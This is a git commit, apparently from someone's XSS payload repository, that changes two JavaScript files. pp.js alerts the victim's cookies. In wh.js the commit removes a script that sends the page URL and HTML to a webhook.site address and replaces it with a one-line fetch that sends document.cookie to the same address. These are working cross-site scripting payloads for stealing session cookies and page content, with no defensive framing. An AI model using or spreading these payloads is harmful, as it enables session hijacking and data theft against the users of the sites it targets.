f3403f07318b2c16e2458be76c88a99aa2c0d877
Ahbon <ahbon@localhost.localdomain>
2025-10-15 18:07:43 +0200

    modify

--- pp.js
+++ pp.js
@@ -1,3 +1,3 @@
 {
-alert (" AHBAN " + document.cookie);
+alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
 }
--- wh.js
+++ wh.js
@@ -1,8 +1,3 @@
-(function(){
-  try {
-    var hook = "https://webhook.site/e925819f-2c81-4cbe-a619-a0f20f9aa493";
-    new Image().src = hook + "?ev=loaded&u=" + encodeURIComponent(location.href);
-    // try to exfiltrate page HTML (no-cors POST still triggers the request)
-    fetch(hook, {method:'POST', mode:'no-cors', body: document.documentElement.innerHTML}).catch(()=>{});
-  } catch(e){}
-})();
+{
+fetch("https://webhook.site/e925819f-2c81-4cbe-a619-a0f20f9aa493?c="+document.cookie);
+}
